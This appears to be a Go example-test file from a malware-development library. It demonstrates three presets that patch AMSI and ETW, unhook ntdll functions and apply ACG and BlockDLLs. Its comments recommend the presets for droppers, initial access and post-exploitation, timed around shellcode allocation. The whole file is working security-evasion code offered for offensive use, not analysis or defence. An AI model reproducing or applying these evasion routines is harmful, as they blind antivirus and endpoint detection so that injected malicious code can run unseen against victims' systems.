package preset_test

import (
	"fmt"

	"github.com/oioio-space/maldev/evasion"
	"github.com/oioio-space/maldev/evasion/preset"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// Minimal patches AMSI ScanBuffer + ETW only. Lowest detection
// surface — appropriate for droppers and initial access where heavy
// hooking hasn't started.
func ExampleMinimal() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	results := evasion.ApplyAll(preset.Minimal(), caller)
	for name, err := range results {
		if err != nil {
			fmt.Printf("%s: %v\n", name, err)
		}
	}
}

// Stealth adds selective ntdll unhook of the ~10 commonly hooked NT
// functions on top of Minimal. Suitable for post-exploitation tools
// that need clean injection primitives.
func ExampleStealth() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	_ = evasion.ApplyAll(preset.Stealth(), caller)
}

// Aggressive applies full ntdll unhook + ACG + BlockDLLs. Apply only
// AFTER your shellcode allocation has succeeded — ACG blocks future
// RWX allocation.
func ExampleAggressive() {
	caller := wsyscall.New(wsyscall.MethodIndirect, nil)
	// ... allocate shellcode FIRST ...
	_ = evasion.ApplyAll(preset.Aggressive(), caller)
}
